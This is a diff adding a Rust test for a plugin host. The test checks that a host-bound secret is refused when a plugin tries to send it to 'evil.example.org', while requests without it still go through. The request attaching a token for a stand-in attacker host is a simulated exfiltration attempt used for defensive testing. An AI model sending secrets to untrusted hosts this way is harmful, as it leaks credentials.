@@ -256,6 +256,55 @@ fn a_plugin_sends_requests_to_its_hosts_with_secrets_it_never_sees() {
 }
 
 #[test]
+fn a_secret_that_names_its_hosts_is_written_into_requests_to_those_only() {
+    let mut host = host(EventStream::new()).unwrap();
+    let token: Arc<dyn Secret> = Arc::new(|| Ok("s3cret-value".to_owned()));
+    let bound = corduroy_core::secret::to_hosts(token, Scope::none().allow("api.example.com"));
+    host.secrets.insert("token", bound).unwrap();
+    // The add-on's own grant is wide: any host, with the secret.
+    host.app.plugin(
+        testbed(vec![
+            ("http", Scope::any()),
+            ("secret", Scope::none().allow("token")),
+        ])
+        .unwrap(),
+    );
+    let fetch = |url: &str, headers: Value| {
+        call(
+            &host,
+            "fetch",
+            &json!({"method": "GET", "url": url, "headers": headers}),
+        )
+        .unwrap()
+    };
+    let with_token = || json!([{"name": "authorization", "secret": "token"}]);
+
+    let named = fetch("https://api.example.com/", with_token());
+    let elsewhere = fetch("https://evil.example.org/", with_token());
+    let without = fetch("https://evil.example.org/", json!([]));
+
+    assert_eq!(named["status"], 200);
+    assert_eq!(
+        elsewhere["denied"],
+        "secret `token` does not name `evil.example.org` among the hosts it may be sent to"
+    );
+    // The host itself is within the grant: what was refused is the secret going there.
+    assert_eq!(without["status"], 200);
+    let sent = host.sent.lock().unwrap();
+    assert_eq!(sent.len(), 2);
+    assert!(
+        sent.iter()
+            .filter(|request| request.url.contains("evil"))
+            .all(|request| request.headers.is_empty())
+    );
+    drop(sent);
+    assert_eq!(
+        payloads(&host.app, "secret/refused"),
+        [json!({"plugin": "testbed", "secret": "token", "host": "evil.example.org"})]
+    );
+}
+
+#[test]
 fn requests_beyond_the_grant_are_refused_before_they_are_sent() {
     let host = fetcher().unwrap();
 
